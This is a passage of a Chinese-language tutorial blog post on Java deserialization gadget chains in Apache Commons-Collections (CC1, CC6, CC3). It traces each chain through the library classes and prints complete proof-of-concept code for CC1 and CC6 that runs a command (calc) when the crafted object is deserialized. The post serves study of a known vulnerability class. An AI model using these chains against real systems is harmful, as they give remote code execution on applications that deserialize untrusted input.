class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-comment">// Handle annotation member accessors</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>实际是个代理类，它实现了<code>InvocationHandler</code>接口。</p><p>我们只需要完成：</p><ol><li><code>readObject</code>中调用任意方法，调用者是<code>AnnotationInvocationHandler</code>代理对象</li><li><code>AnnotationInvocationHandler</code>的<code>invoke</code>触发<code>memberValues.get()</code> ，因此代理对象的<code>memberValues</code>要设为<code>LazyMap</code></li><li><code>LazyMap#get</code>触发<code>factory.transform()</code></li></ol><p>那么POC也就呼之欲出了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(argMap, chainedTransformer);<br><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, evilMap);<br>    <span class="hljs-comment">// 代理对象proxyMap</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br><br>    handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);<br><br><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>    oos.writeObject(handler);<br>    oos.close();<br><br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>POC中触发<code>invoke</code>的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler#readObject =&gt; memberValues.entrySet()<br></code></pre></td></tr></table></figure><p>因此<code>Proxy.newProxyInstance</code>传的是<code>Map</code>的<code>ClassLoader</code>和接口</p><p>但是，<code>LazyMap</code>的漏洞触发在get和invoke中 而<code>TransformedMap</code>的漏洞触发在setValue中 </p><p>同样在 <strong>Jdk8u71</strong>之后，由于<code>AnnotationInvocationHandler</code>不再直接使用反序列化得到的Map对象，而是新建了一个<code>LinkedHashMap</code>对象，后续对Map的操作都是基于这个新的<code>LinkedHashMap</code>对象。 因此CC1链只局限在<strong>Jdk8u71</strong>之前的版本。所以这里弹不出calc，但是原理是这么个原理。</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>为什么不按顺序来，确实因为CC2的特点跟前面CC1接不上，但是CC6可以顺延往下讲，上面说到<strong>Jdk8u71</strong>引入的<code>LinkedHashMap</code>让CC1失效，而CC6克服了这一点，脱胎于CC1，成为Java8系列常见的原生链。</p><p>CC6链子后半段还是使用CC1的<code>LazyMap</code>，由于<code>AnnotationInvocationHandler</code>因Java版本而利用受限，需要找寻其他可以调用<code>LazyMap#get</code>的地方。</p><p>这里又要引入一个完美解决这个问题的类了，接下来赶到战场的是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.keyvalue.TiedMapEntry<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>显而易见的是<code>getValue</code>部分调用了<code>get</code>方法，那么就有链子：</p><p><code>hashCode()</code> &#x3D;&gt; <code>getValue()</code> &#x3D;&gt; <code>map.get(key)</code></p><p>hashCode是在URLDNS中也用到的，作为一个访问DNS的触发器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HashMap#readObject</span><br><span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#hash</span><br><span class="hljs-comment">// 调用hash是为保证键的唯一性</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#put</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以得到一个链：</p><p><code>readObject()</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code></p><p>所以我们就能得出，在这里让<strong>key &#x3D;&#x3D; TiedMapEntry对象</strong>，就能完美连接起来前面的链子了。</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>HashSet#readObject()<br>HashMap#put()<br>HashMap#hash()<br>TiedMapEntry#hashCode()<br>TiedMapEntry#getValue()<br>LazyMap#get()<br>                                <span class="hljs-comment">//恶意对象反射链部分</span><br>      ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>初代目：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">// fake_payload</span><br>Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>    <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">// put的时候也会执行hashCode，为了防止本地调试触发payload，这里放入fake_payload</span><br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br><span class="hljs-comment">// 将真正的transformers数组设置进来</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(expMap);<br>oos.close();<br><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p>但是这个是没办法直接反序列化的。</p><p>当我们执行<code>Map.put()</code>的时候会触发<code>hash()</code>，进而牵动整条链。</p><p>再来看<code>LazyMap</code>的<code>get()</code>，由于是懒加载因此得到当前map中没有key，才会满足那个if条件再调用到<code>factory.transform(key)</code>生成value，再<code>map.put(key, value)</code>，这时候<code>lazyMap</code>中就有key了。（这里的key是<code>new TiedMapEntry</code>传入的key）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// LazyMap#get</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>解决方法也很简单，只需要想办法把这个键值对从<code>LazyMap</code>中移除就行，即<code>lazyMap.remove(&quot;test&quot;);</code></p><p>Final CC6-POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728211545706.png" alt="image-20240728211545706"></p><p>划时代的意义。</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>CC4涉及到更新的Commons-Collections4，所以留到后面讲，而CC3同样具有划时代的意义，因为它的逻辑用到的是恶意字节码，这对于Java反序列化来说是个很常见的Attack方式。</p><p>首先需要介绍的是Java动态加载字节码的东西。</p><p>你可能会看到很多次 <code>Gadgets.createTemplatesImpl(command)</code> ，另外你也许曾在<code>fastjson</code>等漏洞的利用中看到过<code>TemplatesImpl</code>这个类，它究竟是什么，为何出镜率这么高呢？</p><p>字节码是什么就不做过多说明，这与Java作为静态语言而且能够“一次编译，到处运行”的宗旨有关。</p><p>加载字节码的方式也很多，这里先不介绍了，后面会单开一章来讲讲。</p><p>言归正传，CC3这里的背景是一个Question，CC1和CC6的sink都在<code>InvokerTransformer</code>上，若WAF直接禁用了该类，是否就拿它没法了？</p><p>当然不是。但这里就又要请出另一个解决这个问题的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<br></code></pre></td></tr></table></figure><p><strong>“我打宿傩？真的假的？”</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span><br>    TransformerConfigurationException<br>&#123;<br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();<br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>&#125;<br></code></pre></td></tr></table></figure><p>我们先分析一下这个<code>TrAXFilter</code>。</p><p>该类构造方法中调用了<code>(TransformerImpl) templates.newTransformer()</code></p><p><code>TransformerImpl</code>在加载字节码的很多文章那里提过，<code>newTransformer</code>最后能调用到<code>defineClass()</code>加载恶意字节码。</p><p>但是目前看来如果没有<code>InvokerTransfomer</code>，<code>TrAXFilter</code>的构造方法也无法调用</p><p>这里要用到新的<code>Transformer</code>实现类<code>InstantiateTransformer</code>，看看它的<code>transform</code>，它的作用就是调用构造函数，返回类实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class) input).getConstructor(iParamTypes);<br>    <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>    <span class="hljs-comment">//....</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>ChainedTransformer#transform()<br>InstantiateTransformer#transform()<br>    TrAXFilter#TrAXFilter()<br>TemplatesImpl#newTransformer()<br>TemplatesImpl#getTransletInstance()<br>TemplatesImpl#defineTransletClasses()<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>这里需要用到<code>javassist</code>来获取字节码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span 